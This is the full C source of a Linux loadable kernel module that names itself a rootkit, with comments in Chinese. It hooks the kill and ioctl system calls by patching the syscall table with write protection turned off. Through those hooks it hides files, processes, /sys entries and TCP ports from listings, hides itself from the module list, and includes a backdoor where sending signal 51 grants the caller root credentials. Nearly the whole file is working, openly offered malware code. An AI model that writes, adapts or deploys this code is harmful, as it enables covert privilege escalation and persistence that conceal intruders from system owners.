#include <linux/cred.h>
#include <linux/dirent.h>
#include <linux/file.h>
#include <linux/fs.h>
#include <linux/init.h>
#include <linux/kallsyms.h>
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/mutex.h>
#include <linux/unistd.h>
#include <linux/sched.h>
#include <linux/slab.h>
#include <linux/string.h>
#include <linux/syscalls.h>
#include <linux/version.h> 
#include <linux/workqueue.h>
#include <asm/pgtable.h>
#include <asm/special_insns.h>
#include <asm/uaccess.h>
#include <linux/kdev_t.h>
#include <linux/types.h>
#include <linux/list.h>
#include <linux/proc_fs.h>
#include <net/tcp.h> 

#if LINUX_VERSION_CODE >= KERNEL_VERSION(3, 10, 0)
    #include <linux/proc_ns.h>
#else
    #include <linux/proc_fs.h>
#endif
#if LINUX_VERSION_CODE > KERNEL_VERSION(2, 6, 26)
    #include <linux/fdtable.h>
#endif

MODULE_LICENSE("GPL"); //模块许可证声明
#define SIGFLIP 50 //隐藏模块的信号
#define SIGROOT 51 //root后门的信号

#define COMMON_PATH "/" //普通的目录 除/proc /sys /dev /run以外的目录（递归）
#define PROC_PATH "/proc"
#define SYS_PATH "/sys"
#define TCP_IPV4_PATH "/proc/net/tcp"
#define IOCTL_FILECMD 0xfffffffe //隐藏文件的信号
#define IOCTL_PORTHIDE 0xfffffffd //端口隐藏
#define IOCTL_PORTUNHIDE 0xfffffffc //端口显示
#define HIDE_FILE 1
#define UNHIDE_FILE 2
#define HIDE_PROC 3
#define UNHIDE_PROC 4
#define HIDE_SYS 5
#define UNHIDE_SYS 6
#define NEEDLE_LEN 6 //端口号长度 最多是5位数字
#define TMPSZ 150 // /proc/net/tcp每行记录为149


#define SYS_CALL_TABLE \
({ \
unsigned int *p = (unsigned int*)__builtin_alloca(16); \
 p[0] = 0x5f737973; \
 p[1] = 0x6c6c6163; \
 p[2] = 0x6261745f; \
 p[3] = 0x0000656c; \
 (char *)p; \
})

#define SYS_CLOSE \
({ \
unsigned int *p = (unsigned int*)__builtin_alloca(12); \
 p[0] = 0x5f737973; \
 p[1] = 0x736f6c63; \
 p[2] = 0x00000065; \
 (char *)p; \
})

bool hidden = false;
static struct list_head *mod_list;
static unsigned long *sct;

typedef int (*file_iterate) (struct file *filp, struct dir_context *ctx);
typedef int (*file_filldir) (struct dir_context *ctx, const char *name, int namlen, loff_t offset, u64 ino, unsigned d_type);

typedef int (*seq_file_show)(struct seq_file *m, void *v);

asmlinkage int (*org_kill)(pid_t pid, int sig);
asmlinkage int new_kill(pid_t pid, int sig);

asmlinkage long (*org_ioctl)(int fd, int cmd, long arg);
asmlinkage long new_ioctl(int fd, int cmd, long arg);

asmlinkage int (*org_seq_show)(struct seq_file *m, void *v);
asmlinkage int new_seq_show(struct seq_file *seq, void *v); 

void hook_file_op(const char *path, file_iterate new, file_iterate *old); //hook file_opration结构体的iterate
void hook_afinfo_seq_op(const char *path, seq_file_show new, seq_file_show *old); //hook seq_file的show函数

void enable_write(void){
    write_cr0(read_cr0() & (~0x10000));
    return;
}
//关闭写保护

void disable_write(void){
    write_cr0(read_cr0() | 0x10000);
    return;
}
//开启写保护


/* * *
 * 
 * 借助内核的链表 struct list_head
 * 定义一个链表去存储 需要隐藏的文件的inode信息
 * 定义了添加和删除结点的操作
 * common_node_head 头指针
 * common_node_pos 用在之后 list_for_each遍历
 * tmp_common_node_pos 用在之后 list_for_each_safe遍历
 * 
 * * */
struct common_node{
    unsigned long hide_ino;
    struct list_head list;
};

LIST_HEAD(common_node_head); //初始化头指针

struct list_head *common_node_pos;
struct list_head *tmp_common_node_pos;
struct common_node *tmp_common_node;
int common_node_add(unsigned long h_ino);
void common_node_delete(unsigned long h_ino);

int common_node_add(unsigned long h_ino){
    tmp_common_node = kmalloc(sizeof(struct common_node),GFP_KERNEL);
    tmp_common_node->hide_ino = h_ino;
    printk("add common ino: %lu\n", h_ino);
    list_add_tail(&(tmp_common_node->list), &common_node_head); //尾部添加一个node
    return 0;
}

void common_node_delete(unsigned long h_ino){
    list_for_each_safe(common_node_pos, tmp_common_node_pos, &common_node_head){
        tmp_common_node = list_entry(common_node_pos,struct common_node,list); //获得当前位置的node
        if (tmp_common_node->hide_ino == h_ino)
            {
                printk("delete common ino: %lu\n", h_ino);
                list_del(&(tmp_common_node->list));
                break;
            }
    }
    return;
}
/* * *
 * 
 * 结束common_node的定义
 * 
 * * */

asmlinkage int new_common_iterate(struct file *filp, struct dir_context *ctx); //用来hook iterate的
file_iterate org_common_iterate; //用函数指针存储原始的iterate函数的地址
asmlinkage int new_common_filldir(struct dir_context *ctx, const char *name, int namlen, loff_t offset, u64 ino, unsigned d_type);
//用来hook filldir的
file_filldir org_common_filldir; //用函数指针存储原始的filldir函数的地址

/* * *
 * 
 * 和common_node一样的方式定义
 * 用来存储要隐藏的进程
 * 
 * * */
struct proc_node{
    unsigned long hide_ino;
    struct list_head list;
};

LIST_HEAD(proc_node_head);

struct list_head *proc_node_pos;
struct list_head *tmp_proc_node_pos;
struct proc_node *tmp_proc_node;
int proc_node_add(unsigned long h_ino);
void proc_node_delete(unsigned long h_ino);

int proc_node_add(unsigned long h_ino){
    tmp_proc_node = kmalloc(sizeof(struct proc_node),GFP_KERNEL);
    tmp_proc_node->hide_ino = h_ino;
    printk("add proc ino: %lu\n", h_ino);
    list_add_tail(&(tmp_proc_node->list), &proc_node_head);
    return 0;
}

void proc_node_delete(unsigned long h_ino){
    list_for_each_safe(proc_node_pos, tmp_proc_node_pos, &proc_node_head){
        tmp_proc_node = list_entry(proc_node_pos,struct proc_node,list);
        if (tmp_proc_node->hide_ino == h_ino)
            {
                printk("delete proc ino: %lu\n", h_ino);
                list_del(&(tmp_proc_node->list));
                break;
            }
    }
    return;
}
/* * *
 * 
 * 结束proc_node的定义
 * 下面函数和函数指针的定义也同上
 * 
 * * */

asmlinkage int new_proc_iterate(struct file *filp, struct dir_context *ctx);
file_iterate org_proc_iterate;
asmlinkage int new_proc_filldir(struct dir_context *ctx, const char *name, int namlen, loff_t offset, u64 ino, unsigned d_type);
file_filldir org_proc_filldir;

/* * *
 * 
 * 和common_node一样的方式定义
 * 用来存储要隐藏的/sys目录下的文件
 * 
 * * */
struct sys_node{
    unsigned long hide_ino;
    struct list_head list;
};

LIST_HEAD(sys_node_head);

struct list_head *sys_node_pos;
struct list_head *tmp_sys_node_pos;
struct sys_node *tmp_sys_node;
int sys_node_add(unsigned long h_ino);
void sys_node_delete(unsigned long h_ino);

int sys_node_add(unsigned long h_ino){
    tmp_sys_node = kmalloc(sizeof(struct sys_node),GFP_KERNEL);
    tmp_sys_node->hide_ino = h_ino;
    printk("add sys ino: %lu\n", h_ino);
    list_add_tail(&(tmp_sys_node->list), &sys_node_head);
    return 0;
}

void sys_node_delete(unsigned long h_ino){
    list_for_each_safe(sys_node_pos, tmp_sys_node_pos, &sys_node_head){
        tmp_sys_node = list_entry(sys_node_pos,struct sys_node,list);
        if (tmp_sys_node->hide_ino == h_ino)
            {
                printk("delete sys ino: %lu\n", h_ino);
                list_del(&(tmp_sys_node->list));
                break;
            }
    }
    return;
}
/* * *
 * 
 * 结束sys_node的定义
 * 下面函数和函数指针的定义也同上
 * 
 * * */

asmlinkage int new_sys_iterate(struct file *filp, struct dir_context *ctx);
file_iterate org_sys_iterate;
asmlinkage int new_sys_filldir(struct dir_context *ctx, const char *name, int namlen, loff_t offset, u64 ino, unsigned d_type);
file_filldir org_sys_filldir;

/* * *
 * 
 * 大体和common_node的定义一样
 * 区别在于node里面不再是inode信息，而是port信息
 * 
 * * */
struct port_node{
    long port;
    struct list_head list;
};

LIST_HEAD(port_node_head);

struct list_head *port_node_pos;
struct list_head *tmp_port_node_pos;
struct port_node *tmp_port_node;
int port_node_add(long port);
void port_node_delete(long port);

int port_node_add(long port){
    tmp_port_node = kmalloc(sizeof(struct port_node),GFP_KERNEL);
    tmp_port_node->port = port;
    printk("add port: %l\n", port);
    list_add_tail(&(tmp_port_node->list), &port_node_head);
    return 0;
}

void port_node_delete(long port){
    list_for_each_safe(port_node_pos, tmp_port_node_pos, &port_node_head){
        tmp_port_node = list_entry(port_node_pos,struct port_node,list);
        if (tmp_port_node->port == port)
            {
                printk("delete port: %l\n", port);
                list_del(&(tmp_port_node->list));
                break;
            }
    }
    return;
}
/* * *
 * 
 * 结束port_node的定义
 * 
 * * */

struct ksym {
    char *name;
    unsigned long addr;
};

int find_ksym(void *data, const char *name, struct module *module, unsigned long address) {
    struct ksym *ksym = (struct ksym *)data;
    char *target = ksym->name;

    if (strncmp(target, name, KSYM_NAME_LEN) == 0) {
        ksym->addr = address;
        return 1;
    }

    return 0;
}

unsigned long get_symbol(char *name) {
    unsigned long symbol = 0;
    struct ksym ksym;

    ksym.name = name;
    ksym.addr = 0;
    kallsyms_on_each_symbol(&find_ksym, &ksym);
    symbol = ksym.addr;

    return symbol;
}

void *memmem(const void *haystack, size_t haystack_size, const void *needle, size_t needle_size) {
        char *p;

        for(p = (char *)haystack; p <= ((char *)haystack - needle_size + haystack_size); p++) {
            if(memcmp(p, needle, needle_size) == 0) return (void *)p;
        }
        return NULL;
}

#ifdef __x86_64__

unsigned long *find_sys_call_table(void) {
    unsigned long sct_off = 0;
        unsigned char code[512];
        char **p;

        rdmsrl(MSR_LSTAR, sct_off);
        memcpy(code, (void *)sct_off, sizeof(code));

        p = (char **)memmem(code, sizeof(code), "\xff\x14\xc5", 3);
  
        if(p) {
            unsigned long *table = *(unsigned long **)((char *)p + 3);
            table = (unsigned long *)(((unsigned long)table & 0xffffffff) | 0xffffffff00000000);
            return table;
        }
        return NULL;
}

#else

struct {
    unsigned short limit;
    unsigned long base;
} __attribute__ ((packed))idtr;

struct {
    unsigned short off1;
    unsigned short sel;
        unsigned char none, flags;
        unsigned short off2;
} __attribute__ ((packed))idt;

unsigned long *find_sys_call_table(void) {
        char **p;
        unsigned long sct_off = 0;
        unsigned char code[255];

        asm("sidt %0":"=m" (idtr));
        memcpy(&idt, (void *)(idtr.base + 8 * 0x80), sizeof(idt));
        sct_off = (idt.off2 << 16) | idt.off1;
        memcpy(code, (void *)sct_off, sizeof(code));

        p = (char **)memmem(code, sizeof(code), "\xff\x14\x85", 3);

        if(p) return *(unsigned long **)((char *)p + 3);
        else return NULL;
}

#endif

unsigned long *generic_find_sys_call_table(void){
    unsigned long *syscall_table;
    unsigned long _sys_close;
    unsigned long int i;

#if LINUX_VERSION_CODE < KERNEL_VERSION(4, 17, 0)
    _sys_close = get_symbol(SYS_CLOSE);
#endif

    for (i = PAGE_OFFSET; i < ULONG_MAX; i += sizeof(void *)) {
        syscall_table = (unsigned long *)i;

#if LINUX_VERSION_CODE < KERNEL_VERSION(4, 17, 0)
        if (syscall_table[__NR_close] == (unsigned long)sys_close)
#else 
        if (syscall_table[__NR_close] == (unsigned long)_sys_close)
#endif
            return syscall_table;
    }
    return NULL;
}

void modhide(void) {
    if(hidden) return;

    while(!mutex_trylock(&module_mutex)) cpu_relax();
    mod_list = THIS_MODULE->list.prev;
    list_del(&THIS_MODULE->list);
    kfree(THIS_MODULE->sect_attrs);
    THIS_MODULE->sect_attrs = NULL;
    mutex_unlock(&module_mutex);
    hidden = true;
}

void modshow(void) {
    if(!hidden) return;
    while(!mutex_trylock(&module_mutex)) cpu_relax();
    list_add(&THIS_MODULE->list, mod_list);
    mutex_unlock(&module_mutex);
    hidden = false;
}

asmlinkage int new_kill(pid_t pid, int sig){
    switch(sig) {
        case SIGFLIP:
            if(hidden) modshow();
            else modhide();
            break;
        case SIGROOT:
    #if LINUX_VERSION_CODE < KERNEL_VERSION(2, 6, 29)
            current->uid   = 0;
            current->suid  = 0;
            current->euid  = 0;
            current->gid   = 0;
            current->egid  = 0;
            current->fsuid = 0;
            current->fsgid = 0;
            cap_set_full(current->cap_effective);
            cap_set_full(current->cap_inheritable);
            cap_set_full(current->cap_permitted);
    #else
            commit_creds(prepare_kernel_cred(0));
    #endif
            break;
        default:
            return org_kill(pid, sig);
    }
    return 0;
}

/* * *
 * 
 * hoot SYS_IOCTL来和client通信
 * fd参数来对应一个文件
 * cmd命令 IOCTL_FILECMD IOCTL_PORTHIDE IOCTL_PORTUNHIDE三种
 * arg参数 IOCTL_FILECMD---HIDE_FILE
 *                       |-UNHIDE_FILE
 *                       |-HIDE_PROC
 *                       |-UNHIDE_PROC
 *                       |-HIDE_SYS
 *                       |-UNHIDE_SYS
 *        IOCTL_PORTHIDE port
 *        IOCTL_PORTUNHIDE port
 * 
 * * */
asmlinkage long new_ioctl(int fd, int cmd, long arg)
{
    int ret=0;
    struct inode *inode;
    struct dentry *entry;
    struct file *file;

    if(cmd != IOCTL_FILECMD && cmd != IOCTL_PORTHIDE && cmd != IOCTL_PORTUNHIDE)
    {
        return (*org_ioctl)(fd, cmd, arg);
    }

    if(cmd == IOCTL_PORTHIDE) {
        port_node_add(arg);
        return ret;
    }

    if(cmd == IOCTL_PORTUNHIDE) {
        port_node_delete(arg);
        return ret;
    }

    file = fget(fd);
    entry =file->f_path.dentry;
    inode = entry->d_inode;
    //inode的获取可以看看file结构体 可以直接获取 也可以通过dentry去拿

    switch(arg)
    {
        case HIDE_FILE:
	    {
            common_node_add(inode->i_ino);
        }
	    break;
	
        case UNHIDE_FILE:
	    {
            common_node_delete(inode->i_ino);
        }
	    break;

        case HIDE_PROC:
	    {
            proc_node_add(inode->i_ino);
        }
	    break;
	
        case UNHIDE_PROC:
	    {
            proc_node_delete(inode->i_ino);
        }
	    break;

        case HIDE_SYS:
	    {
            sys_node_add(inode->i_ino);
        }
	    break;
	
        case UNHIDE_SYS:
	    {
            sys_node_delete(inode->i_ino);
        }
	    break;
	
        default:
	        return -EINVAL;
    }
    return ret;
}

void hook_file_op(const char *path, file_iterate new, file_iterate *old) {
    struct file *filp;
    struct file_operations *f_op;
    printk("Opening the path: %s\n", path);
    filp = filp_open(path, O_RDONLY, 0);
    if (IS_ERR(filp)) {
        old = NULL;
    } else {
        f_op = (struct file_operations *)filp->f_op; //获取file_oprations结构体
        *(file_iterate *)old = f_op->iterate; //把原始的iterate放到old里存
        enable_write();
        f_op->iterate = new; //把自己的函数给iterate
        disable_write();
    }
}
//file hide

asmlinkage int new_common_iterate(struct file *filp, struct dir_context *ctx)
{
    org_common_filldir = ctx->actor; //actor是filldir的函数指针
    enable_write();
    *(filldir_t *)&ctx->actor = new_common_filldir;
    disable_write();
    return org_common_iterate(filp, ctx); //hook完调用原来的逻辑继续执行
}
asmlinkage int new_common_filldir(struct dir_context *ctx, const char *name, int namlen, loff_t offset, u64 ino, unsigned d_type)
{
    unsigned long d_ino;
    d_ino = ino;
    list_for_each(common_node_pos, &common_node_head){
        tmp_common_node = list_entry(common_node_pos,struct common_node,list);
        if(d_ino == tmp_common_node->hide_ino){
            return 0; //如果当前文件的inode在要隐藏的链表中，直接return，不再后续处理
        }
    }
    return org_common_filldir(ctx, name, namlen, offset, ino, d_type); //hook完调用原来的逻辑继续执行
}

/* * *
 * 
 * new_proc_iterate
 * new_proc_filldir
 * new_sys_iterate
 * new_sys_filldir
 * 和上面的一样，只是实现对不同目录的hook
 * 
 * * */
asmlinkage int new_proc_iterate(struct file *filp, struct dir_context *ctx)
{
    org_proc_filldir = ctx->actor;
    enable_write();
    *(filldir_t *)&ctx->actor = new_proc_filldir;
    disable_write();
    return org_proc_iterate(filp, ctx);
}
asmlinkage int new_proc_filldir(struct dir_context *ctx, const char *name, int namlen, loff_t offset, u64 ino, unsigned d_type)
{
    unsigned long d_ino;
    d_ino = ino;
    list_for_each(proc_node_pos, &proc_node_head){
        tmp_proc_node = list_entry(proc_node_pos,struct proc_node,list);
        if(d_ino == tmp_proc_node->hide_ino){
            return 0;
        }
    }
    return org_proc_filldir(ctx, name, namlen, offset, ino, d_type);
}
asmlinkage int new_sys_iterate(struct file *filp, struct dir_context *ctx)
{
    org_sys_filldir = ctx->actor;
    enable_write();
    *(filldir_t *)&ctx->actor = new_sys_filldir;
    disable_write();
    return org_sys_iterate(filp, ctx);
}
asmlinkage int new_sys_filldir(struct dir_context *ctx, const char *name, int namlen, loff_t offset, u64 ino, unsigned d_type)
{
    unsigned long d_ino;
    d_ino = ino;
    list_for_each(sys_node_pos, &sys_node_head){
        tmp_sys_node = list_entry(sys_node_pos,struct sys_node,list);
        if(d_ino == tmp_sys_node->hide_ino){
            return 0;
        }
    }
    return org_sys_filldir(ctx, name, namlen, offset, ino, d_type);
}

//调试函数 打印每个一级目录的iterate etc: / /etc /dev /var .....
void display_iterate(const char* path){
    struct file *f;
    f = filp_open(path, O_RDONLY, 0);
    struct file_operations *f_op;
    f_op = (struct file_operations *)f->f_op;
    printk("%s iterate is %p\n", path, f_op->iterate);
    return;
}


void hook_afinfo_seq_op(const char *path, seq_file_show new, seq_file_show *old) {
    struct file *filp;                                      
    struct tcp_seq_afinfo *afinfo; //有一个seq_oprations对象来获取show函数                                   
    filp = filp_open(path, O_RDONLY, 0);                    
    if (IS_ERR(filp)) {                  
        old = NULL;                                         
    }                                                        
    afinfo = PDE_DATA(filp->f_path.dentry->d_inode);
    *(seq_file_show *)old = afinfo->seq_ops.show; //原始show
    enable_write();
    afinfo->seq_ops.show = new; //自己定义的show
    disable_write();
    filp_close(filp, 0);
}

int new_seq_show(struct seq_file *seq, void *v) {
    int ret=0;
    char needle[NEEDLE_LEN]; //存端口号
    ret = org_seq_show(seq, v); //调用原始的show函数先缓存区写一行
    list_for_each(port_node_pos, &port_node_head){
        tmp_port_node = list_entry(port_node_pos,struct port_node,list);
        snprintf(needle, NEEDLE_LEN, ":%04X", tmp_port_node->port); //转换成/proc/net/tcp格式的port形式
        if (strnstr(seq->buf + seq->count - TMPSZ, needle, TMPSZ)) { //如果缓冲区的最新一行中包含指定的port
            seq->count -= TMPSZ; //从缓冲区删除这行
            break;
        }
    }
    return ret;
}

static int lkm_init(void)
{
    printk("rootkit module loaded\n");
    sct = (unsigned long *)find_sys_call_table();
    if(!sct) sct = (unsigned long *)get_symbol(SYS_CALL_TABLE);
    if(!sct) sct = (unsigned long *)generic_find_sys_call_table();          
    if(!sct) return -1;
    //获取syscall的地址
    org_kill = (void *)sct[__NR_kill];
    org_ioctl = (void *)sct[__NR_ioctl];
    //保留 kill ioctl的原始地址
    hook_file_op(COMMON_PATH, new_common_iterate, &org_common_iterate);
    //hook 普通的目录
    hook_file_op(PROC_PATH, new_proc_iterate, &org_proc_iterate);
    //hook /proc目录
    hook_file_op(SYS_PATH, new_sys_iterate, &org_sys_iterate);
    //hook /sys目录
    hook_afinfo_seq_op(TCP_IPV4_PATH, new_seq_show, &org_seq_show);
    //hook tcp ipv4的show函数
    enable_write();
    sct[__NR_kill] = (unsigned long)new_kill;
    sct[__NR_ioctl] = (unsigned long)new_ioctl;
    //hook kill ioctl
    disable_write();
    return 0;    
}
 
static void lkm_exit(void)
{
    if(org_kill){
        enable_write();
        sct[__NR_kill] = (unsigned long)org_kill;
        // 还原kill
        disable_write();
    }
    if(org_ioctl){
        enable_write();
        sct[__NR_ioctl] = (unsigned long)org_ioctl;
        // 还原ioctl
        disable_write();
    }
    if (org_common_iterate) {
        void *dummy;
        hook_file_op(COMMON_PATH, org_common_iterate, &dummy); // 还原普通目录
        list_for_each_safe(common_node_pos, tmp_common_node_pos, &common_node_head) {
            tmp_common_node = list_entry(common_node_pos,struct common_node,list);
            list_del(&(tmp_common_node->list));
            // 清空普通目录的链表 删除结点一定要用list_for_each_safe
        }
    }
    if (org_proc_iterate) {
        void *dummy;
        hook_file_op(PROC_PATH, org_proc_iterate, &dummy); // 还原/proc目录
        list_for_each_safe(proc_node_pos, tmp_proc_node_pos, &proc_node_head) {
            tmp_proc_node = list_entry(proc_node_pos,struct proc_node,list);
            list_del(&(tmp_proc_node->list));
        }
    }
    if (org_sys_iterate) {
        void *dummy;
        hook_file_op(SYS_PATH, org_sys_iterate, &dummy); // 还原/sys目录
        list_for_each_safe(sys_node_pos, tmp_sys_node_pos, &sys_node_head) {
            tmp_sys_node = list_entry(sys_node_pos,struct sys_node,list);
            list_del(&(tmp_sys_node->list));
        }
    }
    if (org_seq_show) {
        void *dummy;
        hook_afinfo_seq_op(TCP_IPV4_PATH, org_seq_show, &dummy); // 还原 tcp ipv4的show
        list_for_each_safe(port_node_pos, tmp_port_node_pos, &port_node_head) {
            tmp_port_node = list_entry(port_node_pos,struct port_node,list);
            list_del(&(tmp_port_node->list));
        }
    }
    printk("rootkit module removed\n");
}
 
module_init(lkm_init);
module_exit(lkm_exit);
